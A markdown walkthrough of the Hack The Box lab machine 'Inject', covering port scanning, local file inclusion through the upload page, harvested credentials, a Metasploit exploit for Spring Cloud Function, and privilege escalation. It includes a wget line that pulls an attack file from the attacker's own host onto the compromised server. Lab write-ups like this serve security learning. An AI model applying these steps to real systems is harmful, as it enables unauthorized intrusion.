<img src="https://imgur.com/qbGYyhh.png"
     style="float: left; margin-right: 10px;" />

## INTRODUCTION
This is a step-by-step walkthrough of the Hack The Box Easy Machine: Inject, I will be showcasing the steps I used to successfully it.<br/>
<br />

## ENVIRONMENTS USED
- Kali linux<br/>
- Burp suite<br/>
- Metasploit<br/>
- Wappalyzer<br/>

## WORKSPACE SETUP
Lets first create the directory we will be working in and cd into it.
```
mkdir inject && cd inject
```
<img src="https://imgur.com/pJaYMhJ.png"
     style="float: left; margin-right: 10px;" />

## RECONNAISSANCE
We start of with a complete port scan of the machine using nmap. During the scan, we discover two open ports: 
- Port 22 and Port 8080. 
- Port 22, commonly associated with SSH (Secure Shell), presents a potential avenue for remote access to the target machine. We take note of this for further investigation.<br/>

Furthermore, we focus our attention on Port 8080, as it often hosts web applications or services. By enumerating this port, we aim to uncover any vulnerabilities or <br/>
misconfigurations that may grant us unauthorized access.

We use nmap for this scan. 
```
sudo nmap -sVC -p- -T4 -Pn --open -O {target} -oN tcpfullscan
```
<img src="https://imgur.com/ukTWtoH.png"
     style="float: left; margin-right: 10px;" />

## WEBSERVER ANALYSIS
Our next step involves visiting the webserver and conducting a thorough exploration to identify its components and functionality.
<br/>
Using Wappalyzer, we discover that the webserver is running on the Bootstrap framework. This insight provides valuable information about the underlying technologies.<br/>
<br/>
During our investigation, we encounter several pages on the website. The login page, unfortunately, presents an error, preventing us from accessing its contents. Similarly, the register page is still under construction, limiting our options for interaction.<br/>
<br/>
We discover an interesting feature on the webpage the upload function.  we test its robustness by attempting to upload an HTB Inject PNG image. Our objective is to determine if any restrictions or security measures are in place to prevent unauthorized file uploads.<br/>

By systematically probing the upload functionality, we seek to exploit any weaknesses or misconfigurations that may facilitate our progression and grant us further access to the webserver's underlying systems.

  
## LOCAL FILE INCLUSION
<br/>
Having successfully uploaded and viewed the image, we observe that the uploaded file's parameter is reflected in the URL. This behavior suggests a potential vulnerability known as Local File Inclusion (LFI). Exploiting this vulnerability could allow us to access files on the webserver that are not intended for public viewing.<br/>
<br/>
next step is to use Burp Suite to capture and analyze the requests we send to the webserver.<br>

<br/>
<img src="https://imgur.com/WqErkDX.png"
     style="float: left; margin-right:10px;" />
  
## BURP SUITE EXPLOITATION
- We will start burp suite, upload the file and activate the interceptor. <br/>
- This allows us to gain control over the requests and responses exchanged between our browser and the webserver.<br/>
- Once the file upload is captured by Burp Suite, we can manipulate the GET requests to determine the location where the image was uploaded. This enables us to pinpoint potential vulnerabilities or areas of interest within the webserver's file system.<br/>
- we conduct further analysis of the files on the webserver. During this process, we uncover that the web application is built on the Spring Cloud Framework Boot. This insight equips us with valuable knowledge about the underlying technology stack, enabling us to tailor our exploitation techniques more effectively.

<br/>
<img src="https://imgur.com/x1Lkt9I.png"
     style="float: left; margin-right:10px;" />
<br/>

- We continue navigating through the directories, where we discover a directory named 'Frank' that contains a password and username attributed to 'phil.'
- can navigate through the directories <br/>
- We managed to find a password and username belonging to pbil in the Frank directory. <br/> 
- This could be useful as we move along with our enumeration. <br/>

<img src="https://imgur.com/xBK3fHi.png"
     style="float: left; margin-right:10px" />     
<br/>

## EXPLOITING THE SPRING CLOUD FRAMEWORK WITH METASPLOIT
-After conducting in-depth research on the framework, we discover a known as the 'spring cloud function.' This vulnerability presents us with an opportunity to exploit the system further. For more details on this vulnerability, you can refer to the Rapid7 blog post at link. <br/>
```
https://www.rapid7.com/blog/post/2022/04/01/metasploit-weekly-wrap-up-155/
```
To exploit this vulnerability, we use Metasploit to exploit the identified vulnerability in the Spring Cloud Framework <br/>

Taking advantage of Metasploit, we launch the exploit specifically designed to target the identified vulnerability in the Spring Cloud Framework. By executing this exploit, we gain remote access to the server, providing us with a solid foothold to proceed with further exploration and privilege escalation.<br/>

With this access, we continue our investigation by searching for the user flag. <br/>

<br/>

<img src="https://imgur.com/3UpHmN0.png" style="float: left; margin-right:10px;" />

## USER FLAG
- Navigating through the directories, we locate a file named "user.txt"; however, our current privileges prevent us from directly accessing its contents.
- To overcome this limitation, we revert to the credentials we discovered during our earlier Burp Suite enumeration.
- Switching to the "phil" user using the acquired password, we now have sufficient privileges to read the user flag.

<img src="https://imgur.com/uoielW3.png" style="float: left; margin-right:10px;" />

## ROOT FLAG
To gain root access on the server, we need to elevate our privileges.

- Returning to the root folder, the top-level directory of the server's file system, we navigate to the designated location for uploading files: **/opt/automation/tasks**.
- Here, we create a YML file and upload it to the server. This uploaded script will play a crucial role in increasing our privileges.
<br/>
<img src="https://imgur.com/rZUFtC4.png"  style="float: left; margin-right:10px;" />
<br/>

To upload the file using the shell we created using metasploit.
- we first set up a server on our local machine by running the following command:
```
python -m http.server 80
```

Returning to the shell session on the compromised server, we execute the following command to download the YML script from our local machine:

```
wget http://{own ip}/filename.yml
```

Once the file is successfully uploaded, we validate our escalated privileges. We execute the commands bash -p followed by whoami to verify if we have attained root privileges.

Upon confirmation of our elevated privileges, we navigate to the root directory and proceed to read the contents of the root

<img src="https://imgur.com/OAXJPMc.png"
        style="float: left; margin-right:10px;" />

## CONCLUSION

Thank you for taking the time to read my walkthrough. I value your expertise and welcome any hints or advice you may have regarding my approach or any missed opportunities. 

Your input is highly appreciated as it allows me to continuously learn and enhance my skills. Feel free to share your insights and recommendations, as they will contribute to my growth as a cybersecurity professional.
